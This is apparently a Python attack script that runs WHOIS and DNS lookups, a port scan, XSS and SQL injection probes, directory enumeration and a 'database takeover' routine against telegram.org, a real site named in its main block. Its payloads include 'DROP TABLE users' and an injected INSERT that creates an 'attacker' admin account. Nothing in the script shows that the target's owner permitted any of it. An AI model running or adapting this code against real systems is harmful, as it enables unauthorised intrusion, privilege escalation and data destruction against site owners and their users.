import socket
import whois
import requests
import dns.resolver
from urllib.parse import urlparse
import re

def whois_info(domain):
    domain_info = whois.whois(domain)
    return domain_info

def dns_lookup(domain):
    try:
        result = dns.resolver.resolve(domain, 'A')
        ips = [ip.address for ip in result]
        return ips
    except Exception as e:
        return f"Error: {str(e)}"

def get_tech_stack(url):
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
    }
    response = requests.get(f"https://api.wappalyzer.com/v2/lookup/?urls={url}", headers=headers)
    return response.json()

def scan_ports(target):
    open_ports = []
    for port in range(1, 1025):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        result = sock.connect_ex((target, port))
        if result == 0:
            open_ports.append(port)
        sock.close()
    return open_ports

def test_xss(url):
    xss_payload = "<script>alert('XSS')</script>"
    full_url = f"{url}?input={xss_payload}"
    try:
        response = requests.get(full_url)
        if xss_payload in response.text:
            return "XSS vulnerability found!"
        return "No XSS vulnerability detected."
    except requests.exceptions.RequestException as e:
        return f"Error during XSS test: {str(e)}"

def test_sql_injection(url):
    payloads = [
        "' OR '1'='1' --",
        "' UNION SELECT NULL, NULL, NULL --",
        "'; DROP TABLE users; --",
        "' AND 1=2 --"
    ]
    for payload in payloads:
        full_url = f"{url}{payload}"
        try:
            response = requests.get(full_url)
            if "error" in response.text.lower() or "mysql" in response.text.lower():
                return f"SQL Injection vulnerability detected with payload: {payload}"
        except requests.exceptions.RequestException as e:
            return f"Error during SQL Injection test: {str(e)}"
    return "No SQL Injection vulnerability detected."

def database_takeover(url):
    payload = "'; INSERT INTO users (username, password, role) VALUES ('attacker', 'password123', 'admin'); --"
    full_url = f"{url}{payload}"
    try:
        response = requests.get(full_url)
        if "error" not in response.text.lower():
            return "Successfully added a new admin user to the database!"
        else:
            return "Failed to exploit database takeover."
    except requests.exceptions.RequestException as e:
        return f"Error during database takeover attempt: {str(e)}"

def web_enumeration(url):
    common_files = [
        "admin", "config", "login", "register", "wp-admin", "dashboard", "phpmyadmin"
    ]
    discovered_files = []
    for file in common_files:
        test_url = f"{url}/{file}"
        try:
            response = requests.get(test_url)
            if response.status_code == 200:
                discovered_files.append(test_url)
        except requests.exceptions.RequestException as e:
            pass
    return discovered_files
  
def run_tests(domain):
    print("Running tests on:", domain)
    print("\nWHOIS Information:")
    print(whois_info(domain))
    print("\nDNS Lookup:")
    print(dns_lookup(domain))
    print("\nTechnology Stack:")
    tech_stack = get_tech_stack(domain)
    print(tech_stack)
    print("\nOpen Ports:")
    open_ports = scan_ports(domain)
    print(open_ports)
    print("\nXSS Vulnerability Test:")
    print(test_xss(f"http://{domain}"))
    print("\nSQL Injection Test:")
    print(test_sql_injection(f"http://{domain}"))
    print("\nDatabase Takeover Test:")
    print(database_takeover(f"http://{domain}"))
    print("\nWeb Enumeration:")
    files = web_enumeration(f"http://{domain}")
    print(files)

if __name__ == "__main__":
    domain = "telegram.org"
    run_tests(domain)
